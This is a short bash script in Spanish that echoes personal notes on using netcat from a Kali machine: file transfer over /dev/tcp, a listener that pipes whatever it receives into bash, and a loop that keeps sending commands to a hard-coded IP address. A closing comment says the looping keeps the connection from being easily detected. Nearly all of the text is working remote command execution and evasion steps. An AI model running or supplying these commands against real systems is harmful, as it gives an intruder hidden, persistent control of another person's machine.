#!/usr/bin/env bash

echo '''
#ir a extraction de mi pagina para comandos

# Enviar archivos con nc usando TCP
# Original:
# nc -nlvp 1234 < archivo
# cat > archivo < /dev/tcp/$ip_kali/1234

# En Kali (escuchar y enviar archivo):
nc -nlvp 1234 < archivo

# En la máquina que recibe:
cat > archivo < /dev/tcp/$ip_kali/1234

# Verificar integridad:
md5sum archivo

# --------------------------------------------------

# Usar nc para enviar comandos o archivos:

# Original:
# cat adios| nc -q 1 100.65.128.115 1234

# En Kali (envía el contenido de "adios" para ejecutarlo en destino):
cat adios | nc -q 1 100.65.128.115 1234

# Ejemplo de contenido de "adios":
# nano adios
# minet

# En la máquina destino (Ubuntu) para ejecutar lo recibido:
# Original:
# nc -l -p 1234 | bash

# Escuchar y ejecutar automáticamente:
nc -l -p 1234 | bash

# --------------------------------------------------

# Para enviar repetidamente en un loop:

# En Kali:
while true; do
    cat adios | nc -q 1 100.65.128.115 1234
    sleep 3
done

# En Ubuntu para recibir y ejecutar en loop:
while true; do
    nc -l -p 1234 | bash
    sleep 1
done

# Así no se detecta fácil la conexión.

'''